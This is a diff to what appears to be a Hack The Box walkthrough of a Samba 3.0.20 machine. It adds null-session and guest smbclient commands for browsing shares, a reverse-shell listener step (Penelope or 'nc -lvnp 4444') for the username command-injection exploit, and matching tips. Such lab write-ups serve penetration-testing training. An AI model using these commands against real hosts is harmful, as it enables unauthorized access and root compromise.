@@ -110,8 +110,12 @@ tn.write(password.encode('ascii') + b"\n")
 
 ### SMB (139/445) — Samba 3.0.20-Debian
 
+List shares with a null session, then connect to a share as **guest** (empty username, no
+password) to browse it without credentials:
+
 ```bash
-smbclient -L //10.129.66.131/ -N
+smbclient -L //10.129.66.131/ -N            # list shares (null session)
+smbclient //10.129.66.131/tmp -U "" -N       # connect to a share as guest
 ```
 
 ```
@@ -156,10 +160,12 @@ By embedding a command inside the username (` `` ` backticks), we get code execu
 Samba process owner — which on this box is **root**. This is done manually, no Metasploit
 required (OSCP-friendly).
 
-**1. Start a listener:**
+**1. Start a listener.** A plain `nc -lvnp 4444` works, but I use
+[**Penelope**](https://github.com/brightio/penelope) — it auto-upgrades the incoming shell to
+a full PTY, manages sessions, and logs everything:
 
 ```bash
-nc -lvnp 4444
+penelope 4444          # or: nc -lvnp 4444
 ```
 
 **2. Trigger the injection via `smbclient`** — the payload lives in the username:
@@ -308,6 +314,10 @@ root.txt: HTB{__REDACTED__}
   port was filtered. Verify quickly, then abandon rabbit holes without ego.
 - **SUID binaries are a first-stop for Linux privesc.** `find / -perm -4000` + [GTFOBins](https://gtfobins.github.io/)
   is a reflex you'll use on nearly every Linux box.
+- **Enumerate SMB with a null/guest session first.** `smbclient //IP/share -U "" -N` browses
+  shares with no credentials — often the fastest way to find a foothold or loot.
+- **Use a real shell handler.** [Penelope](https://github.com/brightio/penelope) auto-upgrades
+  catches to a full PTY and manages multiple sessions — far less painful than raw `nc`.
 
 ---
 
